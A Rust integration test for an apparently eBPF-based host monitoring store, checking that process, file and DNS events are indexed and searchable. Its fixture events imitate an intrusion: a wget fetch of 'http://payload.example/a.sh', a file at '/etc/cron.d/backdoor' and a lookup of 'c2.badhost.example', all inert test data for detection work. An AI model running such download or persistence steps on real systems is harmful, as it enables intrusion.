#![allow(clippy::unwrap_used, clippy::expect_used)]

//! Real schema events written through the store and found through the index.

use witness_common::schema::*;
use witness_store::disk::DiskPolicy;
use witness_store::index::{Filter, Index};
use witness_store::verify::verify_dir;
use witness_store::{Config, Store};

fn ev(pid: u32, uid: u32, body: Body) -> Event {
    Event {
        v: SCHEMA_VERSION,
        seq: 0,
        boot_id: "aaaaaaaa-0000-0000-0000-000000000000".into(),
        boot_ns: pid as u64 * 10,
        wall_ns: 1_700_000_000_000_000_000 + pid as u64,
        wall_uncertain: false,
        src: Source::Ebpf,
        prio: body.priority() as u8,
        actor: Some(Actor {
            puid: puid("aaaaaaaa-0000", pid, 5),
            pid,
            tid: pid,
            ppid: 1,
            uid,
            gid: uid,
            euid: uid,
            egid: uid,
            user: None,
            auid: Some(uid),
            ses: Some(2),
            cgroup_id: 1,
            comm: "wget".into(),
            exe: Some("/usr/bin/wget".into()),
            cmdline: Some(vec!["wget".into(), "http://payload.example/a.sh".into()]),
            tty: None,
        }),
        body,
        h: None,
    }
}

#[test]
fn schema_events_are_indexed_and_searchable() {
    let t = tempfile::tempdir().unwrap();
    let (mut s, _) = Store::open(
        t.path(),
        Config {
            disk: DiskPolicy::disabled(),
            ..Default::default()
        },
    )
    .unwrap();
    let file = FileOp {
        path: "/etc/cron.d/backdoor".into(),
        path_resolved: true,
        path_truncated: false,
        dev: 1,
        ino: 2,
        mode: None,
        flags: None,
        result: HookResult::Allowed,
    };
    let dns = DnsEvent {
        direction: DnsDir::Query,
        server: "10.0.0.1".parse().unwrap(),
        server_port: 53,
        id: 1,
        qname: "c2.badhost.example".into(),
        qtype: "A".into(),
        rcode: None,
        answers: vec![],
        transport: Proto::Udp,
        truncated: false,
    };
    let exec = ProcExec {
        filename: "wget".into(),
        exe: "/usr/bin/wget".into(),
        argv: vec!["wget".into(), "http://payload.example/a.sh".into()],
        argv_truncated: false,
        cwd: None,
        env: None,
        stdio: None,
        interactive: false,
    };
    s.append(ev(100, 1000, Body::ProcExec(exec)).to_fields().unwrap())
        .unwrap();
    s.append(ev(101, 0, Body::FileCreate(file)).to_fields().unwrap())
        .unwrap();
    s.append(ev(102, 1000, Body::Dns(dns)).to_fields().unwrap())
        .unwrap();
    s.sync().unwrap();

    let dir = s.segment_dir().to_path_buf();
    assert!(verify_dir(&dir).unwrap().is_ok());
    let mut ix = Index::open(&t.path().join("index.db")).unwrap();
    ix.catch_up(&dir).unwrap();

    let q = |f: Filter| ix.query(&Filter { limit: 50, ..f }).unwrap();
    assert_eq!(
        q(Filter {
            kinds: vec!["proc_exec".into()],
            ..Default::default()
        })
        .len(),
        1
    );
    assert_eq!(
        q(Filter {
            pid: Some(101),
            ..Default::default()
        })
        .len(),
        1
    );
    assert_eq!(
        q(Filter {
            uid: Some(0),
            ..Default::default()
        })[0]
            .kind,
        "file_create"
    );
    assert_eq!(
        q(Filter {
            puid: Some(puid("aaaaaaaa-0000", 102, 5)),
            ..Default::default()
        })
        .len(),
        1
    );
    // Full-text: cmdline, file path and DNS name are all findable.
    assert_eq!(
        q(Filter {
            text: Some("payload".into()),
            ..Default::default()
        })
        .len(),
        3
    );
    assert_eq!(
        q(Filter {
            text: Some("backdoor".into()),
            ..Default::default()
        })
        .len(),
        1
    );
    assert_eq!(
        q(Filter {
            text: Some("badhost".into()),
            ..Default::default()
        })
        .len(),
        1
    );
}
